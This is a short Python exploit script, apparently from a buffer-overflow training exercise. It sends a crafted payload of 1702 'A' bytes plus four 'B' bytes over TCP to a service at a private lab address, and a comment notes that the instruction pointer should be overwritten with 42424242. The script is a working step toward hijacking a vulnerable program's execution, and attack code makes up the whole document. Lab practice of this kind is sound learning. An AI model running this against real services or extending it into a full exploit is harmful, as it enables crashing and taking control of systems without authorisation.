#!/usr/bin/python

import sys,socket

shellcode = 'A'*1702 + 'B'*4 #if done correctly, you should see the EIP filled with 42424242

ip = '192.168.10.51'
port = 2371

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send((shellcode))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()
